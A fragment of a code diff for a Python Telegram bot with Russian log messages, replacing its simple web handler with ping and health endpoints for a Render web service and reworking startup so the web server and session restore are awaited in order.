-    formatted_tz = f"+{offset}" if offset >= 0 else f"{offset}"
-    try:
-        await callback.answer(get_text(user_id, "msg_tz_saved", formatted_tz), show_alert=True)
-    except Exception:
-        pass
     await menu_timenick(callback)
 
-async def handle_web(request):
-    return web.Response(text="Bot is running!")
+# === RENDER WEB SERVICE ENDPOINT ===
+async def handle_ping(request):
+    return web.Response(text="OK")
 
 async def start_web_server():
-    try:
-        app = web.Application()
-        app.router.add_get("/", handle_web)
-        runner = web.AppRunner(app)
-        await runner.setup()
-        port_val = os.getenv("PORT", "8080") or "8080"
-        port = int(port_val)
-        site = web.TCPSite(runner, "0.0.0.0", port)
-        await site.start()
-        logging.info(f"🌐 Вэб-сервер запущен на порту {port}")
-    except Exception as e:
-        logging.error(f"❌ Ошибка запуска веб-сервера: {e}")
+    app = web.Application()
+    app.router.add_get("/", handle_ping)
+    app.router.add_get("/health", handle_ping)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    port = int(os.getenv("PORT", 8080))
+    site = web.TCPSite(runner, "0.0.0.0", port)
+    await site.start()
+    logging.info(f"🌐 Веб-сервер запущен на порту {port}")
 
 async def main():
-    asyncio.create_task(start_web_server())
-    asyncio.create_task(restore_saved_sessions())
+    await start_web_server()
+    await restore_saved_sessions()
+    logging.info("🚀 Бот запущен")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    loop.run_until_complete(main())
